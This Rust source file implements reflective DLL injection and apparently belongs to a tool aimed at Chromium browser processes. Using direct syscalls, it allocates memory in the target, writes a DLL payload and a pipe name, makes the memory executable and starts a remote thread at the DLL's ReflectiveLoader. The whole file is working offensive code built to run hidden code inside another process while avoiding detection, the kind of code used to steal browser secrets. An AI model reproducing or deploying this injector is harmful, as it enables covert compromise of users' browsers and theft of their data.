use crate::modules::browser::chromium::system::{pe, syscalls};
use crate::utils;
use anyhow::{Result, anyhow};
use std::ffi::c_void;
use winapi::shared::ntdef::NT_SUCCESS;
use winapi::um::winnt::HANDLE;

const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const PAGE_EXECUTE_READ: u32 = 0x20;

pub fn inject(
    process_handle: HANDLE,
    dll_buffer: &[u8],
    pipe_name_param: *const c_void,
) -> Result<bool> {
    // Find ReflectiveLoader export offset
    let rdi_offset = pe::find_reflective_loader_offset(dll_buffer)?;
    unsafe {
        // First, allocate memory for the pipe name in the target process
        let pipe_name_wide = pipe_name_param as *const u16;
        let mut pipe_name_len = 0;

        // Calculate the length of the wide string (including null terminator)
        while *pipe_name_wide.add(pipe_name_len) != 0 {
            pipe_name_len += 1;
        }
        pipe_name_len += 1; // Include null terminator

        let pipe_name_size = pipe_name_len * 2; // 2 bytes per wide char

        let mut pipe_name_remote: *mut c_void = std::ptr::null_mut();
        let mut pipe_name_region_size = pipe_name_size;

        let status = syscalls::nt_allocate_virtual_memory(
            process_handle,
            &mut pipe_name_remote,
            0,
            &mut pipe_name_region_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if !NT_SUCCESS(status) {
            return Err(anyhow!(
                "Failed to allocate memory for pipe name. Status: {}",
                utils::ntstatus_to_string(status)
            ));
        }

        // Write the pipe name to target process memory
        let mut bytes_written = 0;
        let status = syscalls::nt_write_virtual_memory(
            process_handle,
            pipe_name_remote,
            pipe_name_param,
            pipe_name_size,
            &mut bytes_written,
        );

        if !NT_SUCCESS(status) {
            return Err(anyhow!(
                "Failed to write pipe name to target memory. Status: {}",
                utils::ntstatus_to_string(status)
            ));
        }

        // Allocate memory in target process for DLL
        let mut remote_mem: *mut c_void = std::ptr::null_mut();
        let mut region_size = dll_buffer.len();

        let status = syscalls::nt_allocate_virtual_memory(
            process_handle,
            &mut remote_mem,
            0,
            &mut region_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if !NT_SUCCESS(status) {
            return Err(anyhow!(
                "NtAllocateVirtualMemory failed. Status: {}",
                utils::ntstatus_to_string(status)
            ));
        }

        println!("[#] Memory allocated in target at 0x{:p}", remote_mem);

        // Write DLL to target memory
        let mut bytes_written = 0;
        let status = syscalls::nt_write_virtual_memory(
            process_handle,
            remote_mem,
            dll_buffer.as_ptr() as *const c_void,
            dll_buffer.len(),
            &mut bytes_written,
        );

        if !NT_SUCCESS(status) {
            return Err(anyhow!(
                "NtWriteVirtualMemory failed. Status: {}",
                utils::ntstatus_to_string(status)
            ));
        }

        println!(
            "[#] Payload written to target memory. Bytes written: {}",
            bytes_written
        );

        // Change memory protection to executable
        let mut old_protect = 0;
        let status = syscalls::nt_protect_virtual_memory(
            process_handle,
            &mut remote_mem,
            &mut region_size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );

        if !NT_SUCCESS(status) {
            return Err(anyhow!(
                "NtProtectVirtualMemory failed. Status: {}",
                utils::ntstatus_to_string(status)
            ));
        }

        println!(
            "[#] Memory permissions changed from 0x{:x} to PAGE_EXECUTE_READ (0x{:x})",
            old_protect, PAGE_EXECUTE_READ
        );

        // Calculate ReflectiveLoader address in target process
        let loader_addr = ((remote_mem as usize) + rdi_offset) as *const c_void;
        println!(
            "[#] Calculated remote ReflectiveLoader address: 0x{:p}",
            loader_addr
        );

        // Create remote thread with the remote pipe name pointer
        let mut thread_handle: HANDLE = std::ptr::null_mut();

        println!(
            "[#] Creating remote thread with remote pipe name parameter: {:p}",
            pipe_name_remote
        );

        let status = syscalls::nt_create_thread_ex(
            &mut thread_handle,
            winapi::um::winnt::THREAD_ALL_ACCESS,
            std::ptr::null_mut(),
            process_handle,
            loader_addr,
            pipe_name_remote,     // Use the remote memory address instead
            0,                    // CreateFlags
            0,                    // ZeroBits
            0,                    // StackSize
            0,                    // MaximumStackSize
            std::ptr::null_mut(), // AttributeList
        );

        if !NT_SUCCESS(status) {
            return Err(anyhow!(
                "NtCreateThreadEx failed. Status: {}",
                utils::ntstatus_to_string(status)
            ));
        }

        println!("[#] Remote thread created successfully");

        // Give the thread some time to initialize, but don't wait for completion
        // since the DLL should remain running to handle pipe communication
        use winapi::shared::winerror::WAIT_TIMEOUT;
        use winapi::um::synchapi::WaitForSingleObject;

        let wait_result = WaitForSingleObject(thread_handle, 2000); // 2 second timeout for initial setup

        match wait_result {
            WAIT_TIMEOUT => {
                println!("[#] Remote thread still running (this is expected for DLL injection)");
            }
            _ => {
                println!("[#] Remote thread completed initialization");
            }
        }

        // Close thread handle (but thread continues running)
        winapi::um::handleapi::CloseHandle(thread_handle);
        Ok(true)
    }
}
